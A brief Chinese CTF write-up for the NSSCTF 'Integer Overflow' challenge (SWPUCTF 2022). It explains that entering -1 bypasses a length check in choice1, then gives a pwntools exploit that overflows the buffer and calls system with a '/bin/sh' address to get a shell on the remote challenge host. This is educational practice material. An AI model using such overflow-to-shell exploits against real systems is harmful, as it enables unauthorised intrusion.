[[SWPUCTF 2022 新生赛]Integer Overflow | NSSCTF](https://www.nssctf.cn/problem/2634)
![[Pasted image 20240902215332.png]]
![[Pasted image 20240902215351.png]]
走了大致流程可以发现`choice1`函数有溢出点，同时可以发现有`system`和`binsh`
![[Pasted image 20240902215427.png]]
那么就要让v6的值足以让我们进行溢出。输入`-1`即可。
exp:
```python
from pwn import *

elf = ELF('./intoverflow')
context(arch='i386', os='linux', log_level='debug')
local = False
if local:
    p = process('./intoverflow')
else:
    p = remote("node5.anna.nssctf.cn", 24776)

system = elf.symbols['system']
binsh = 0x0804A008

payload = b'a' * (0x20 + 4) + p32(system) + b'aaaa' + p32(binsh)

p.sendlineafter(b'choice:', b'1')
p.sendlineafter(b'name:', b'-1')
p.sendlineafter(b'name?', payload)
p.interactive()
```
